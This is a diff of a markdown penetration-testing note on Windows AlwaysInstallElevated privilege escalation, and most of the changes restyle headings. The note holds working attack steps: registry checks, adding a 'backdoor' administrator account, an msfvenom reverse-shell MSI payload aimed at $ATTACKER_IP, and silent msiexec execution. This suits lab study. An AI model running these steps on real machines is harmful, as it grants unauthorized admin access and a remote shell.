@@ -1,6 +1,9 @@
-# <span style="color:lightblue">AlwaysInstallElevated</span>
+# <span style="color:#FF5555">AlwaysInstallElevated</span>
 
-## <span style="color:lightgreen">Methodology</span>
+> [!info] Variables used below
+> - `$ATTACKER_IP` – your attacking machine's IP
+
+## <span style="color:#8BE9FD">Methodology</span>
 
 AlwaysInstallElevated  is a type of Registry Escalation.
 
@@ -14,8 +17,8 @@ HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 ```
 If the AlwaysInstallElevated value is not set to "1" under both of the preceding registry keys, the installer uses elevated privileges to install managed applications and uses the current user's privilege level for unmanaged applications.
 
-## <span style="color:lightgreen">Detection</span>
-### Windows VM
+## <span style="color:#8BE9FD">Detection</span>
+### <span style="color:#50FA7B">Windows VM</span>
 
 1. Open command prompt and type: 
 ```console
@@ -33,7 +36,7 @@ C:\Temp>reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 
 From the both output, we notice that `“AlwaysInstallElevated”` value is `1`. Hence, we can abuse this function to get privilege escalation.
 
-### Using PowerUp
+### <span style="color:#50FA7B">Using PowerUp</span>
 
 1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the AlwaysInstallElevated field)
 ```console
@@ -54,9 +57,9 @@ C:\Temp> net localgroup administrators
 # now backdoor is added to the localgroup administrators group
 ```
 
-## <span style="color:lightgreen">Exploitation</span>
+## <span style="color:#8BE9FD">Exploitation</span>
 
-### Kali VM
+### <span style="color:#50FA7B">Kali VM</span>
 
 1. Start a netcat listener
 ```console
@@ -64,11 +67,11 @@ $ sudo nc -nvlp 53
 ```
 2. Open an additional command prompt and type: 
 ```console
-$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f msi -o setup.msi
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=53 -f msi -o setup.msi
 ```
 3. Copy the generated file, `setup.msi`, to the Windows VM.
 
-### Windows VM
+### <span style="color:#50FA7B">Windows VM</span>
 
 1. Place `'setup.msi'` in `'C:\Temp'`
 2. Open command prompt and type: 
@@ -76,7 +79,7 @@ $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f msi -o s
 C:\Temp> msiexec /quiet /qn /i C:\Temp\setup.msi
 ```
 
-### Kali VM
+### <span style="color:#50FA7B">Kali VM</span>
 
 1. Wait for a reverse shell on your kali machine.
 
